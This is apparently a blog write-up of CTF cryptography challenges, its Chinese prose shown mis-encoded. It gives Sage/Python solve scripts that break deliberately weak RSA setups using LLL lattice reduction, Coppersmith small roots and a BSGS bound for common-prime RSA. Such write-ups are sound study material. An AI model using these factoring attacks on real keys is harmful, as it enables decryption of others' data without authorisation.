¹æ®$(1)$è¿™ä¸ªå¼å­å†™å‡ºå‰©ä¸‹çš„ä¸€æ ·çš„å¼å­<br>$$<br>\begin{cases}<br>N_1q_0 - N_0q_1 = r_1q_0 - r_0q_1 \\<br>N_2q_0 - N_0q_2 = r_2q_0 - r_0q_2 \\<br>\vdots \\<br>N_8q_0 - N_0q_8 = r_8q_0 - r_0q_8<br>\end{cases}<br>$$<br>æ ¹æ®è¿™ä¸ªå¼å­, å¯ä»¥é€ å‡ºæ ¼å­<br>$$<br>(q_0,q_1,â€¦,q_8)<br>\begin{pmatrix}<br>2^\lambda&amp;N_1&amp;N_2&amp;\cdots&amp;N_8 \\<br>0&amp;-N_0&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;-N_0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\ddots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;-N_0<br>\end{pmatrix}<br>=<br>(2^\lambda q_0,r_1q_0-r_0q_1,â€¦,r_8q_0-r_0q_8)<br>$$</p><h3 id="lambda-çš„å–å€¼"><a href="#lambda-çš„å–å€¼" class="headerlink" title="$\lambda$ çš„å–å€¼"></a>$\lambda$ çš„å–å€¼</h3><p>è¿™é‡Œæœ‰ä¸ªå‚æ•°$\lambda$éœ€è¦ç¡®å®šä¸‹æ¥, è¿™ä¸ªå‚æ•°è·Ÿæœ€çŸ­å‘é‡çš„ä¸Šç•Œæœ‰å…³, ä¸€ç›´ä»¥æ¥è¿™ä¸ªå‚æ•°éƒ½æ˜¯ç”¨æ¥è°ƒç›®æ ‡å‘é‡é•¿åº¦å’Œæ ¼çš„è¡Œåˆ—å¼ç”¨çš„, ä¹Ÿæ²¡æœ‰å…·ä½“çš„åˆ†æè¿‡, æ¯æ¬¡åšçš„æ—¶å€™éƒ½ç›´æ¥çˆ†ç ´, è¿™æ¬¡æ…¢æ…¢åˆ†æäº†ä¸€ä¸‹.</p><p>å…ˆæ¥çœ‹æˆ‘ä»¬è¦æ±‚çš„å‘é‡, æš‚æ—¶è®°ä¸º$v$<br>$$<br>\begin{align}<br>||v|| &amp; = \sqrt{(2^\lambda q_0)^2 + (r_1q_0-r_0q_1)^2 + \cdots +(r_8q_0-r_0q_8)^2} \\<br>&amp; \approx \sqrt{2^{2\lambda+1332}+2^{1998}+\cdots+2^{1998}} \\<br>&amp; = \sqrt{2^{2\lambda+1332}+2^{2001}} \\<br>&amp; \approx<br>\begin{cases}<br>2^{1001} , \lambda \le 335 \\<br>2^{\lambda + 666} , \lambda &gt;335<br>\end{cases}<br>\end{align}<br>$$<br>å†æ¥çœ‹çœ‹$det(L)$</p><p>$$<br>det(L)  = 2^\lambda \cdot N_0^8 \approx 2^{\lambda+8880}<br>$$<br>æ ¼å­æ˜¯9ç»´çš„, é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æœ‰ä¸€ä¸ªç²—ç•¥çš„ä¸ç­‰å¼ $||v|| \le det(L)^{1/9}$<br>é€šè¿‡ç®€å•çš„è®¡ç®—å°±å¯ä»¥å¾—åˆ°<br>$$<br>129 &lt; \lambda &lt; 360 \tag 2<br>$$<br>å¾—åˆ°å‚æ•°çš„å¤§æ¦‚å–å€¼èŒƒå›´, é€‰ä¸€ä¸ªä¸­é—´çš„å°±è¡Œäº†, <del>æƒ³åˆºæ¿€ä¸€ç‚¹å¯ä»¥è¯•è¯•130 359ä¹‹ç±»çš„(åæ­£æˆ‘è¯•äº†éƒ½æ˜¯å¯ä»¥çš„).</del></p><blockquote><p>(2) å¼åªæ˜¯ç²—ç•¥å¾—åˆ°çš„, å› ä¸ºä¸Šç•Œè¿˜æœ‰æ›´ä¸¥æ ¼çš„æ¡ä»¶è€Œä¸”LLLç®—æ³•å®é™…ä¸Šè¦æ¯”ç†è®ºä¸Šè¦å¥½â€¦.</p></blockquote><p>æˆ‘ä»¬æ„é€ å‡ºæ ¼å­å¹¶è§„çº¦åå°±èƒ½å¾—åˆ°$q_0$äº†, å‰©ä¸‹çš„å°±æ˜¯ä»¿é€ è¿™ä¸ªæ ¼å­æ„é€ æ±‚$q_1,\cdots,q_8$çš„æ ¼å­, æ±‚å‡ºæ‰€æœ‰çš„$q$ä»¥å, å› ä¸º$q&gt;r$ , æ‰€ä»¥$N = r \mod q$, ç›´æ¥å°±å¯ä»¥æ±‚å‡º$r$äº†, ç»§ç»­æ±‚å‡º$p$,ç„¶åå°±æ˜¯æ­£å¸¸çš„RSAè§£å¯†äº†.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">N = [...]</span><br><span class="line">C = [...]</span><br><span class="line">Q = []</span><br><span class="line">R = []</span><br><span class="line">D = []</span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    M = <span class="number">2</span>^<span class="number">130</span></span><br><span class="line">    L = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    L[<span class="number">0</span>] = [M]+N[<span class="number">0</span>:t] + N[t+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        L[i][i] = - N[t]</span><br><span class="line">    L[<span class="number">0</span>][<span class="number">0</span>] = M</span><br><span class="line">    MQ = <span class="built_in">abs</span>(matrix(L).LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">assert</span>  MQ % M == <span class="number">0</span></span><br><span class="line">    Q.append(MQ // M)</span><br><span class="line">    t+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n,q <span class="keyword">in</span> <span class="built_in">zip</span>(N,Q):</span><br><span class="line">    R.append(n % q)</span><br><span class="line"></span><br><span class="line">p = (N[<span class="number">0</span>] - R[<span class="number">0</span>]) // Q[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (Q[i]-<span class="number">1</span>)</span><br><span class="line">    D.append(inverse_mod(<span class="number">0x1337</span>,phi))</span><br><span class="line"><span class="keyword">for</span> c,d,q <span class="keyword">in</span> <span class="built_in">zip</span>(C,D,Q):</span><br><span class="line">    print(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q))[-<span class="number">5</span>:].decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Common-Prime-RSA"><a href="#Common-Prime-RSA" class="headerlink" title="Common_Prime_RSA"></a>Common_Prime_RSA</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_prime</span>(<span class="params">nibt, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nibt * gamma))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = <span class="number">2</span> * g * getPrime(<span class="built_in">int</span>(nibt * (<span class="number">0.5</span> - gamma))) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = <span class="number">2</span> * g * getPrime(<span class="built_in">int</span>(nibt * (<span class="number">0.5</span> - gamma))) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">2</span> * p &gt; q <span class="keyword">and</span> <span class="number">2</span> * q &gt; p</span><br><span class="line">    <span class="keyword">return</span> p, q, g</span><br><span class="line"></span><br><span class="line">p1, q1, g1 = get_my_prime(<span class="number">1024</span>, <span class="number">0.2247</span>)</span><br><span class="line">p2, q2, g2 = get_my_prime(<span class="number">1024</span>, <span class="number">0.3247</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">n2 = p2 * q2</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(n1))</span><br><span class="line"><span class="comment"># 0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(<span class="string">b&#x27;Common prime RSA is a variant of RSA&#x27;</span> + long_to_bytes(g1) + <span class="string">b&#x27;And the common factor g is large prime and p=2ga+1 q=2gb+1&#x27;</span>), <span class="number">3</span>, n1)))</span><br><span class="line"><span class="comment"># 0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">pow</span>(g2, <span class="number">65537</span>, n1)))</span><br><span class="line"><span class="comment"># 0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(n2))</span><br><span class="line"><span class="comment"># 0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffd</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(flag.encode()), <span class="number">65537</span>, n2)))</span><br><span class="line"><span class="comment"># 0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111</span></span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>è¿™é“é¢˜åšçš„æ—¶å€™è‡ªå·±è¸©äº†å‘, ä¹Ÿæ²¡åšå‡ºæ¥, åé¢çœ‹wpæ‰¾åˆ°äº†é‚£ä¸ªpaperæ‰å¤§æ¦‚æ˜ç™½, å…³äºç•Œçš„ç¡®å®šè¿˜å¾—è°¢è°¢d33å¸ˆå‚….</p><h3 id="coppersmith"><a href="#coppersmith" class="headerlink" title="coppersmith"></a>coppersmith</h3><p>è¿™é¢˜çš„ç¬¬ä¸€ä¸ªproblemå°±æ˜¯æ±‚è§£$g_1$, ç¬¬ä¸€ä¸ªæ˜æ–‡å¯ä»¥åˆ†æˆä¸‰éƒ¨åˆ†<br>$$<br>Plaintext_1 = high | g_1 | low \tag 1<br>$$<br>$high$å’Œ$low$æˆ‘ä»¬éƒ½æ˜¯çŸ¥é“çš„, è€Œ$g1$å’Œ$low$çš„ä½æ•°åˆ†åˆ«ä¸º$230,463$</p><p>æ‰€ä»¥ç†è®ºä¸Š$(1)$å¼å¯ä»¥å†™æˆ<br>$$<br>Plaintext_1 = 2^{693} \cdot high + 2^{463}\cdot g_1 + low<br>$$<br>è¿™é‡Œå°±æœ‰ä¸ªå‘äº†, å­—ç¬¦ä¸²åœ¨æ‹¼æ¥çš„æ—¶å€™è‚¯å®šéƒ½æ˜¯å®Œæ•´çš„å­—èŠ‚åœ¨æ‹¼çš„, æ‰€ä»¥æ¯ä¸€æ®µçš„ä½æ•°éƒ½åº”è¯¥æ˜¯8çš„å€æ•°æ‰å¯¹, æ‰€ä»¥æ­£ç¡®çš„$(1)$å¼åº”è¯¥ä¸º:<br>$$<br>Plaintext_1 = 2^{696} \cdot high + 2^{464} \cdot g_1 + low<br>$$<br> $g_1$çš„ä½æ•°ä¸º$230$, æ˜¯æ»¡è¶³coppersmithçš„æ¡ä»¶çš„.</p><p>æˆ‘ä»¬è®°$mbar = 2^{696}\cdot high + low$, é‚£ä¹ˆå°±æœ‰$c_1 = (mbar+2^{464}\cdot g_1)^3 \mod n_1$, åŒ–æˆé¦–ä¸€å¤šé¡¹å¼åcoppersmith methodå³å¯æ±‚å‡º$g_1$</p><h3 id="further-attacks-on-server-aided-rsa"><a href="#further-attacks-on-server-aided-rsa" class="headerlink" title="further attacks on server-aided rsa"></a>further attacks on server-aided rsa</h3><p>æˆ‘ä»¬ä»ä¸Šéƒ¨åˆ†å¾—åˆ°äº†$g_1$ , æˆ‘ä»¬å¯ä»¥çœ‹çœ‹$p,q$å’Œ$g$çš„å…³ç³», ä¸ºäº†æ–¹ä¾¿è®¨è®º, ç›´æ¥è®°$g = 2g_1$<br>$$<br>p = xg+1 \\<br>q = yg+1<br>$$<br>é‚£ä¹ˆæˆ‘ä»¬æœ‰<br>$$<br>{N - 1 \over g} = xyg + (x+y) \tag 2<br>$$<br>è¿™é‡Œè®¾$xy = u - c, x+y =v+cg$, é‚£ä¹ˆ$(2)$å¼å¯ä»¥åŒ–æˆ<br>$$<br>{N - 1 \over g} = ug+v<br>$$<br>è¿™é‡Œçš„$v &lt; g$ , ä¹Ÿå°±æ˜¯æŠŠ$v$çœ‹æˆæ˜¯${N-1\over g }\mod g$çš„ç»“æœ. é‚£ä¹ˆ$u,v$éƒ½æ˜¯å¯ä»¥è®¡ç®—å‡ºæ¥çš„, é‡ç‚¹åœ¨äºæ–°å¼•å…¥çš„$c$, æ±‚å‡º$c$å°±å¯ä»¥æ±‚$p,q$äº†</p><p>paperé‡Œæä¾›äº†ä¸€ç§åˆ©ç”¨bsgs<del>åŒ—ä¸Šå¹¿æ·±</del>æ€æƒ³çš„æ–¹æ³•æ¥æ±‚å‡ºè¿™ä¸ªc, ä½†è¿™é¢˜è·Ÿpaperåœ¨cçš„ç•Œä¸Šæœ‰åŒºåˆ«.</p><blockquote><p>åŸpaperæ˜¯è¿™æ ·çš„, æˆ‘ä»¬éšä¾¿æ‰¾ä¸€ä¸ªç´ æ•°$a$ , è§‚å¯Ÿä¸‹é¢çš„å¼å­<br>$$<br>a^{ug} \equiv a^{xyg+cg} \equiv a^{cg} \mod N<br>$$<br>ä¸ºä»€ä¹ˆ$a^{xyg}$æ²¡æœ‰äº†å‘¢? å› ä¸º$k \cdot lcm(p-1,q-1) = xyg$ .</p><p>ç„¶åæ±‚ä¸€ä¸‹$c$çš„ä¸Šç•Œ, åé¢è¦ç”¨åˆ°<br>$$<br>\begin{align}<br>&amp;\because x+y  =v+ cg \\<br>&amp;\therefore x+y &gt; cg \\<br>&amp;\because x,y \approx {\sqrt{N} \over g} \\<br>&amp;\therefore  cg &lt; {2 \sqrt{N} \over g} \\<br>&amp;\therefore 0&lt;c &lt; {2 \sqrt{N} \over g^2}<br>\end{align}<br>$$<br>è®°$b = a^g \mod N$, æˆ‘ä»¬æœ‰$b^u \equiv b^c \mod N$ , paperé‡Œæåˆ°äº†è¿™ä¸ª$u,c$æ˜¯å¾ˆå¤§æ¦‚ç‡ç›¸ç­‰çš„, æœ‰å¸ˆå‚…çŸ¥é“ä¸ºä»€ä¹ˆå—?<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨bsgsçš„æ€æƒ³, è®¡ç®—ä¸¤ç»„æ•°.<br>$$<br>\begin{align}<br>&amp; b^0,b^D,b^{2D},\cdots,b^{D^2} \mod N \\<br>&amp; b^u,b^{u-1},b^{u-2},\cdots,b^{u-D} \mod N<br>\end{align}<br>$$<br>å…¶ä¸­$D = \lfloor \sqrt{ {2 \sqrt N \over g^2}-0}\rceil$</p><p>åœ¨è¿™ä¸¤ç»„æ•°ä¸­æœç´¢ç¢°æ’, ä¹Ÿå°±æ˜¯$b^{u-i} \equiv b^{kD} \mod N$ . æ‰¾åˆ°ç¢°æ’ä»¥åå°±å¯ä»¥è®¡ç®—$c = kD + i$äº†, æœ‰äº†$c$å°±å¯ä»¥åˆ†è§£$N$äº†</p></blockquote><p>å½“æˆ‘çœ‹å®Œpaperä»¥åå…´å¥‹çš„å†™äº†$exp$, å´å‘ç°è¿™ä¸ªåŒ—ä¸Šå¹¿æ·±æŠŠæˆ‘å†…å­˜å…¨éƒ¨åƒå®Œéƒ½æ²¡æœ‰ç»“æœ(æ—©ä¸Šèµ·æ¥å‘ç°ç”µè„‘å±å¹•éƒ½æ‰“ä¸å¼€äº†â€¦.<br>æ€ä¹ˆä¼šæ²¡ç»“æœå•Šâ€¦åªèƒ½å»çœ‹<a href="https://d33b4t0.com/">d33</a>å¸ˆå‚…çš„wpäº†! å› ä¸ºä»–ä»€ä¹ˆéƒ½ä¼š, çœ‹å®Œæ‰æ˜ç™½åŸæ¥paperé‡Œçš„ç•Œå¤ªæ¾æ•£äº†, å¯¼è‡´$D$å¤ªå¤§, è·‘å‡ºæ¥éœ€è¦å¤šå‡ æ ¹å†…å­˜æ‰è¡Œ, å¯æ˜¯æˆ‘åªæœ‰ä¸€æ ¹8Gçš„å†…å­˜. </p><p>d33å¸ˆå‚…çš„ç•Œ:</p><p>å› ä¸º$p,q$çš„ä½æ•°ç›¸åŒ, æ‰€ä»¥æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªéšè—çš„å…³ç³»å¼<br>$$<br>p&gt;2q \implies x &lt; 2y \tag3 \implies {x\over 2}&lt; y<br>$$<br>è¿™ä¸ªå¼å­å¾ˆé‡è¦, æˆ‘ä»¬ç»§ç»­è§‚å¯Ÿä¸€ä¸‹$x+y$å’Œ$c$çš„å…³ç³»$x+y -v  = cg$, æˆ‘ä»¬å¯ä»¥æ ¹æ®åŸºæœ¬ä¸ç­‰å¼å†™å‡ºä¸Šç•Œ, å†æ ¹æ®$(3)$å¼å†™å‡ºä¸‹ç•Œ<br>$$<br>{ 3\sqrt N \over 2g } - v\approx {3\over 2}x-v\leq cg \leq 2 \sqrt{xy} - v \approx {2\sqrt N \over g} -v<br>$$<br>æ ¹æ®è¿™ä¸ª, å’±ä»¬å°±æœ‰ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„$c$çš„ç•Œ<br>$$<br>c \in [ { 3\sqrt N - 2gv\over 2g^2 },{2\sqrt N - gv \over g^2} ]<br>$$<br>åŒæ ·çš„, è®¡ç®—$D = \lfloor {2\sqrt N - gv \over g^2}- { 3\sqrt N - 2gv\over 2g^2 }  \rceil $, å†ç”¨bsgså°±å¯ä»¥æ±‚å‡º$c$äº†, <del>ä½†æˆ‘8Gçš„å°å†…å­˜ä¾æ—§è·‘ä¸å‡ºæ¥</del>, åªèƒ½å€Ÿç”¨ä¸€ä¸‹d33å¸ˆå‚…çš„æ•°æ®äº†</p><p>åˆ†è§£äº†$n_1$å°±èƒ½æ±‚å‡º$g_2$, ç”±äº$g_2$çš„ä½æ•°æ¯”è¾ƒå¤§, $g_2 &gt; x+y$, ç›´æ¥å°±æœ‰:<br>$$<br>{n_2 - 1 \over 2g_2} = x+y \mod 2g_2<br>$$<br>$xy$ä¹Ÿå¯ä»¥ç›´æ¥æ±‚å‡ºæ¥äº†, ç„¶åä¾æ—§æ˜¯åˆ†è§£$n_2$, å°±å¯ä»¥æ±‚å‡ºflagäº†</p><h2 id="epx"><a href="#epx" class="headerlink" title="epx"></a>epx</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b,bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n1 = <span class="number">0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49</span></span><br><span class="line">n2 = <span class="number">0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffd</span></span><br><span class="line">c1 = <span class="number">0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156</span></span><br><span class="line">c2 = <span class="number">0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5</span></span><br><span class="line">c3 = <span class="number">0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111</span></span><br><span class="line">a = b2l(<span class="string">b&#x27;Common prime RSA is a variant of RSA&#x27;</span>) &lt;&lt; <span class="number">696</span></span><br><span class="line">b = b2l(<span class="string">b&#x27;And the common factor g is large prime and p=2ga+1 q=2gb+1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mbar = a+b</span><br><span class="line">R.&lt;x&gt; = Zmod(n1)[]</span><br><span class="line">f = ((<span class="number">2</span>^<span class="number">464</span>) * x + mbar) ^ <span class="number">3</span> - c1</span><br><span class="line">f = f.monic()</span><br><span class="line">g1 = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span>^<span class="number">230</span>,beta=<span class="number">1</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">beta = <span class="number">2</span>* g1</span><br><span class="line">v = ((n1 - <span class="number">1</span>) // beta)% beta</span><br><span class="line">u = ((n1 - <span class="number">1</span>) // beta - v) // beta</span><br><span class="line">b = <span class="built_in">pow</span>(<span class="number">2</span>,beta,n1)</span><br><span class="line">left = (<span class="number">2</span>*<span class="built_in">int</span>(sqrt(n1))//beta-<span class="number">2</span>-v)//beta </span><br><span class="line">right = (<span class="number">3</span>*<span class="built_in">int</span>(sqrt(<span class="number">2</span>)*sqrt(n1))//(<span class="number">2</span>*beta) - <span class="number">2</span> - v )//beta </span><br><span class="line">D = <span class="built_in">int</span>(sqrt(right - left)) + <span class="number">1</span></span><br><span class="line"><span class="comment">#############################################################</span></span><br><span class="line"><span class="comment">#  è¿™éƒ¨åˆ†åº”è¯¥æ˜¯bsgséƒ¨åˆ†ç”±äºæ²¡åŠæ³•è·‘å‡ºç»“æœ,æ— æ³•ç¡®å®šè‡ªå·±çš„ç®—æ³•æ˜¯å¦æ­£ç¡®  #</span></span><br><span class="line"><span class="comment">#  æ‰€ä»¥å°±å…ˆä¸æ”¾å‡ºæ¥äº†,æƒ³çŸ¥é“å…·ä½“çš„å¯ä»¥æ‰¾d33å¸ˆå‚…çš„åšå®¢               #</span></span><br><span class="line"><span class="comment">#############################################################</span></span><br><span class="line"></span><br><span class="line">c=left+<span class="number">698170</span>*D+<span class="number">5980588</span></span><br><span class="line">xy = u - c </span><br><span class="line">x_y = v + c * beta</span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = x^<span class="number">2</span> - x_y * x + xy</span><br><span class="line">x,y = f.roots()[<span class="number">0</span>][<span class="number">0</span>],f.roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">p,q = x *beta+<span class="number">1</span>,y*beta+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n1</span><br><span class="line">g2 = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2,<span class="built_in">int</span>(inverse_mod(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))),n1))</span><br><span class="line">beta = <span class="number">2</span> * g2</span><br><span class="line">x_y = ((n2 - <span class="number">1</span>) // beta)% beta</span><br><span class="line">xy = ((n2 - <span class="number">1</span>) // beta - x_y) // beta</span><br><span class="line">x = var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = x^<span class="number">2</span> - x_y * x + xy</span><br><span class="line">x,y = f.roots()[<span class="number">0</span>][<span class="number">0</span>],f.roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">p,q = x *beta+<span class="number">1</span>,y*beta+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n2</span><br><span class="line">l2b(<span class="built_in">pow</span>(c3,<span class="built_in">int</span>(inverse_mod(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))),n2))</span><br></pre></td></tr></table></figure><h1 id="Strange-CRT"><a href="#Strange-CRT" class="headerlink" title="Strange_CRT"></a>Strange_CRT</h1><blockquote><p>å•Šå•Šå•ŠHWçš„æŠ¥å‘Šè¿˜æ²¡å†™, å’•å’•å’•</p><p>to be continuedâ€¦.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
